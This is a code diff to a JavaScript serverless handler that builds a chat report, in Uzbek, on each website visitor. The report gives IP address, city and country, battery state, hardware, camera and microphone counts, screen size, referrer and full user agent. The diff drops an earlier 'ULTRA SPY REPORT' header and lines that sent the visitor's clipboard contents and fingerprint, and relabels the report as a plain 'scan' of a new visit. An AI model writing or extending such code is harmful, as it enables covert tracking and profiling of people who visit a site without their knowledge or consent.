@@ -14,24 +14,25 @@ export default async function handler(req, res) {
     const uzTime = new Date(now.getTime() + (5 * 60 * 60 * 1000)).toLocaleString('uz-UZ', { timeZone: 'UTC' });
 
     const message = `
-🕵️‍♂️ *ULTRA SPY REPORT: ${data.fingerprint}*
+🚀 *ULTRA SCAN: Yangi Tashrif*
 ----------------------------
 🕒 *Vaqt:* ${uzTime}
 📱 *Qurilma:* ${data.exactModel || data.platform}
-🌐 *Ilova:* ${data.userAgent?.substring(0, 40)}...
+🌍 *Joylashuv:* ${data.city || ''}, ${data.country || ''}
+🌍 *IP:* ${ip}
 
-🆔 *Fingerprint:* \`${data.fingerprint}\`
-🚫 *AdBlock:* ${data.adBlock}
-📋 *Clipboard:* \`${data.clipboard?.substring(0, 50)}\`
 🔋 *Batareya:* ${data.battery?.level} (${data.battery?.charging})
-
 🧠 *RAM:* ${data.ram} GB | *CPU:* ${data.cores}
 🎮 *GPU:* \`${data.gpu}\`
-🌍 *Region:* ${data.timezone} | 🇺🇿 *Til:* ${data.language}
-📷 *Media:* Cam(${data.media?.videoinput || 0}), Mic(${data.media?.audioinput || 0})
 
-🌍 *IP:* ${ip}
-📍 *Joylashuv:* ${data.city || ''}, ${data.country || ''}
+📷 *Media:* Cam(${data.media?.videoinput || 0}), Mic(${data.media?.audioinput || 0})
+🌍 *Region:* ${data.timezone} | 🇺🇿 *Til:* ${data.language}
+👆 *Touch:* ${data.touchPoints} | 📐 *Holat:* ${data.orientation}
+🖥 *Ekran:* ${data.screenSize}
+🔗 *Referrer:* ${data.referrer}
+
+📝 *User-Agent (Hom shaklda):*
+\`${data.userAgent}\`
 ----------------------------
 `;
 
